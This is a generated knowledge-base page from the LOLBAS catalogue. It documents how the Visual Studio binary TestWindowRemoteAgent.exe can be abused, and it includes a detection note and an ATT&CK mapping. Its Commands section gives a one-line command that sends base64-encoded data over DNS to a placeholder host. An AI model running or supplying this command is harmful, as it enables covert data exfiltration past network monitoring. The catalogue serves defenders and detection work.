---
title: "TestWindowRemoteAgent.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Testwindowremoteagent.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Testwindowremoteagent.yml"
build_date: "2026-04-27 18:39:01"
category: "OtherMSBinaries"
aliases:
  - "TestWindowRemoteAgent.exe"
functions:
  - "Upload"
attack_technique_ids:
  - "T1048"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# TestWindowRemoteAgent.exe

TestWindowRemoteAgent.exe is the command-line tool to establish RPC

## Metadata

- Category: OtherMSBinaries
- Created: 2023-08-21
- Author: Onat Uzunyayla
- Source Path: yml/OtherMSBinaries/Testwindowremoteagent.yml

## Paths

- `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe`

## Commands

### 1. Upload

Sends DNS query for open connection to any host, enabling exfiltration over DNS

```cmd
TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
```

- Use Case: Attackers may utilize this to exfiltrate data over DNS
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048]]

## Detections

- IOC: TestWindowRemoteAgent.exe spawning unexpectedly

## Acknowledgements

- {'Person': 'Onat Uzunyayla'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Testwindowremoteagent.yml)
